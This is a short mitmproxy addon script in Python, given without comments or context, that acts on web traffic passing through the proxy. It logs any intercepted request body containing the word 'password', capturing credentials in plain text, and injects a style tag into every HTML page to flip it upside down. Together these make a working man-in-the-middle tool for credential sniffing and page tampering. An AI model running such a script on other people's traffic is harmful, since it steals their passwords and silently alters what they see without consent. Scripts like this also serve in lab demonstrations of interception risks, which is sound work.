from mitmproxy import http, ctx


def response(flow: http.HTTPFlow) -> None:
    if flow.request and flow.request.content:
        if b"password" in flow.request.content:
            ctx.log.info(flow.request.content)

    if flow.response and flow.response.content:
        flow.response.content = flow.response.content.replace(
            b"</head>",
            b"<style>body {transform: scaleY(-1);}</style></head>"
        )